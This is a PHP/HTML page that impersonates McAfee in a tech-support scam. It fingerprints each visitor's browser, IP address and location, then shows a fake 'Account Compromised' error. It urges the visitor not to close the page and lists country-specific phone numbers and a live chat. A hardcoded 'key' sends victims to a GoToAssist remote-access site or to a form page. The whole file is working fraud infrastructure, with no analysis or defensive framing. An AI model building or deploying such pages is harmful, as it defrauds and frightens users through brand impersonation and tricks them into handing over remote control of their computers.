<?php
$u_agent = $_SERVER['HTTP_USER_AGENT'];
$str_info = substr($u_agent, 11, 50);
$os=substr($str_info, 0, strpos($str_info, "AppleWebKit")); 


function getBrowser()
{
$u_agent = $_SERVER['HTTP_USER_AGENT'];
$bname = 'Unknown';
$platform = 'Unknown';
$version= "";

//First get the platform?
if (preg_match('/linux/i', $u_agent)) {
$platform = 'linux';
}
elseif (preg_match('/macintosh|mac os x/i', $u_agent)) {
$platform = 'mac';
}
elseif (preg_match('/windows|win32/i', $u_agent)) {
$platform = 'windows';
}

// Next get the name of the useragent yes seperately and for good reason
if(preg_match('/MSIE/i',$u_agent) && !preg_match('/Opera/i',$u_agent))
{
$bname = 'Internet Explorer';
$ub = "MSIE";
}
elseif(preg_match('/Trident/i',$u_agent))
{ // this condition is for IE11
$bname = 'Internet Explorer';
$ub = "rv";
}
elseif(preg_match('/Firefox/i',$u_agent))
{
$bname = 'Mozilla Firefox';
$ub = "Firefox";
}
elseif(preg_match('/Chrome/i',$u_agent))
{
$bname = 'Google Chrome';
$ub = "Chrome";
}
elseif(preg_match('/Safari/i',$u_agent))
{
$bname = 'Apple Safari';
$ub = "Safari";
}
elseif(preg_match('/Opera/i',$u_agent))
{
$bname = 'Opera';
$ub = "Opera";
}
elseif(preg_match('/Netscape/i',$u_agent))
{
$bname = 'Netscape';
$ub = "Netscape";
}

// finally get the correct version number
// Added "|:"
$known = array('Version', $ub, 'other');
$pattern = '#(?<browser>' . join('|', $known) .
')[/|: ]+(?<version>[0-9.|a-zA-Z.]*)#';
if (!preg_match_all($pattern, $u_agent, $matches)) {
// we have no matching number just continue
}

// see how many we have
$i = count($matches['browser']);
if ($i != 1) {
//we will have two since we are not using 'other' argument yet
//see if version is before or after the name
if (strripos($u_agent,"Version") < strripos($u_agent,$ub)){
    $version= $matches['version'][0];
}
else {
    $version= $matches['version'][1];
}
}
else {
$version= $matches['version'][0];
}

// check if we have a number
if ($version==null || $version=="") {$version="?";}

return array(
'userAgent' => $u_agent,
'name'      => $bname,
'version'   => $version,
'platform'  => $platform,
'pattern'    => $pattern
);
}

// now try it
$ua=getBrowser();
$yourbrowser= $ua['name'] . " " . $ua['version'] ;


function getIPAddress() {  
//whether ip is from the share internet  
if(!empty($_SERVER['HTTP_CLIENT_IP'])) {  
        $ip = $_SERVER['HTTP_CLIENT_IP'];  
}  
//whether ip is from the proxy  
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {  
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];  
}  
//whether ip is from the remote address  
else{  
     $ip = $_SERVER['REMOTE_ADDR'];  
}  
return $ip;  
}  
$ip = getIPAddress();



?>
<?php 
    $location=(unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip)));
    $city= $location['geoplugin_city'];
    $state= $location['geoplugin_region'];
    $country= $location['geoplugin_countryName'];
    $zip= $location['geoplugin_areaCode'];
    $c_code= $location['geoplugin_countryCode'];
 ?> 
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Loading</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.0/css/bootstrap.min.css">
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.0/js/bootstrap.min.js"></script>
    <link rel="stylesheet" href="css/style.css">
    <link rel="stylesheet" href="css/login.css">

    <link href="https://fonts.googleapis.com/css?family=Lato:300&display=swap" rel="stylesheet">
    <link rel="shortcut icon" href="../img/favicon.ico">

    <style>
        ::-webkit-input-placeholder { /* Edge */
    color: #4d4d4d;
    font-size: 16px;
    font-weight: 300;
    text-align:left;
    /* padding-left:15px; */
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
  }
  
  :-ms-input-placeholder { /* Internet Explorer */
    color: #4d4d4d;
  }
  
  ::placeholder {
    color: #4d4d4d;
  }
        .loader 
        {   
            margin-left:45%;
            margin-top:15%;
            border: 16px solid #f3f3f3;
            border-radius: 50%;
            border-top: 16px solid #c01818;
            width: 120px;
            height: 120px;
            -webkit-animation: spin 2s linear infinite; /* Safari */
            animation: spin 2s linear infinite;
            }

            /* Safari */
            @-webkit-keyframes spin {
            0% { -webkit-transform: rotate(0deg); }
            100% { -webkit-transform: rotate(360deg); }
            }

            @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .rk-activ1{
            margin-top:8%;
        }
        .loader2 
        {   
            margin-left:35%;
            margin-top:10%;
            display:none;
            border: 16px solid #f3f3f3;
            border-radius: 50%;
            border-top: 16px solid #662d91;
            width: 120px;
            height: 120px;
            -webkit-animation: spin 2s linear infinite; 
            animation: spin 2s linear infinite;
            }

            @-webkit-keyframes spin {
            0% { -webkit-transform: rotate(0deg); }
            100% { -webkit-transform: rotate(360deg); }
            }

            @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        @media only screen and (max-width: 1200px)
        {
            .loader
            {
                margin-top:18%;
                margin-left:45%;
            }
        }
        @media only screen and (max-width: 1000px)
        {
            .loader
            {
                margin-top:25%;
                margin-left:45%;
            }
        }
        @media only screen and (max-width: 1000px)
        {
            .loader
            {
                margin-top:25%;
                margin-left:45%;
            }
        }
        @media only screen and (max-width: 425px)
        {
            .loader
            {
                margin-top:35%;
                margin-left:35%;
            }
        }
        #actr{
            display:none;
        }
    </style>
</head>
<body>
    <!-- <div class="nav-cont">
        <div class="container">
            <div>
                <img src="img/logo.png" alt="">     
            </div>
        </div>
    </div> -->
    <div class="loader"></div>

<div class="loader1">
    <div class="container">
        <div class="col-lg-10 col-lg-offset-1 er-heafd">
            
            <div class="img-diva">
                <img src="../img/logo.png" alt="">     
            </div>
            <h1 class="in-head text-center">Error <span>"MCA361P"</span> Unable to sign in your account</h1>
            <p class="text-center nd-para-2">Account Compromised - Unable to confirm your identity</p>
            <p class="text-center nd-para-3">Do not refresh or close the page you might loose your mcafee Account</p>
            <p class="text-center nd-para-4">you will get a call from our support representative shortly. If you cannot wait we recommend you to contact chat support now </p>
            <h3 class="text-center nd-para-5">Contact Customer Support </h3>
            <div class="er-back-img">
                <div class="col-lg-6 col-md-6 col-sm-6 text-center">
                    <h3 class="head-sec-back">Try Our Community</h3>
                    <p class="head-sec-backp">Email us and we will follow up within 24 hours.</p><br>
                    <a href="" id="str-chat1" data-toggle="modal" data-target="#myModal">Email us</a>
                </div>
                <div class="col-lg-6 col-md-6 col-sm-6 text-center">
                    <h3 class="head-sec-back">Need to talk to an expert?</h3>
                    <p class="head-sec-backp">For instant help live chat now to resolve the issues</p><br>
                    <a href="javascript:void(Tawk_API.toggle())" id="str-chat2">Live Chat</a>
                </div>  
            </div>
            <img src="../img/f2.png" class="image-responsive fot-image" alt="">
            <a id="str-chat" data-toggle="modal" data-target="#myModal1">Connect to Technician</a>
        </div>
    </div>
</div>



<!-- Email Modal -->
    <div class="modal fade" id="myModal" role="dialog">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-body text-center">
                    <button type="button" class="close" data-dismiss="modal">&times;</button>
                    <form action="" id="form1">
                        <span class="email-span"></span>
                        <p >Chat with a support representative to generate key</p>
                        <input type="text" class="modal-input email-input" placeholder="Enter your Key">
                        <input type="submit" value="Submit" class="modal-submit">
                    </form>
                </div>
            </div>
         </div>
    </div>
<!-- //Email Modal -->
<!-- connect Modal -->
    <div class="modal fade" id="myModal1" role="dialog">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-body text-center">
                    <button type="button" class="close" data-dismiss="modal">&times;</button>
                    <form action="" id="form2">
                        <span class="contact-span"></span>
                        <p >Chat with a support representative to generate key</p>
                        <input type="text" class="modal-input contact-input" placeholder="Enter your Key">
                        <input type="submit" value="Submit" class="modal-submit">
                    </form>
                </div>
            </div>
         </div>
    </div>
<!-- //connect Modal -->
<div class="footer">
  <p><span class="cont-text">Customer Support Toll Free :</span> <span class="number-hp">
  
  <?php 
if($c_code == "US")
{
echo "US/CA +1 844 514 0332";
}
elseif($c_code == "CA")
{
echo "US/CA +1 844 514 0332";
}
elseif($c_code == "GB")
{
echo "UK   +44 800 229 4982";
}
elseif($c_code == "AU")
{
echo "AU   +1 844 514 0332";
}
elseif($c_code == "NZ")
{
echo "NZ   +1 844 514 0332";
}
else
{
    echo "+1 844 514 0332";
}
?>  
  </span> </p>
</div>
</body>
</html>
<script>
    $(document).ready(function(){
    $(".loader1").hide();
    setTimeout(function(){
	$(".loader1").show();
},6000);

    setTimeout(function(){
	$(".loader").hide();
},6000);
});
</script>
<script>
    function redirect()
    {
        window.location="https://fastsupport.gotoassist.com/";
    }
    function redirect1()
    {
        window.location="form.php";
    }
    $("#form1").submit(function()
    {
        var a = $(".email-input").val().toLowerCase();
        if(a == "mca59")
        {
            setTimeout("redirect1()", 0)
        }
        else{
        $(".email-span").text("Not Valid").show("8000");
        event.preventDefault();
        }
    })
    $("#form2").submit(function()
    {
        var a = $(".contact-input").val().toLowerCase();
        if(a == "mca59")
        {
            setTimeout("redirect()", 0)
        }
        else {
        $(".contact-span").text("Not Valid").show(8000);
        event.preventDefault();
    }
    })
</script>
<!--Start of Tawk.to Script--> 
<script type="text/javascript"> var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date(); (function(){ var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0]; s1.async=true; s1.src='https://embed.tawk.to/5bbfe6d208387933e5bb0362/default'; s1.charset='UTF-8'; s1.setAttribute('crossorigin','*'); s0.parentNode.insertBefore(s1,s0); })(); </script>
 <!--End of Tawk.to Script-->
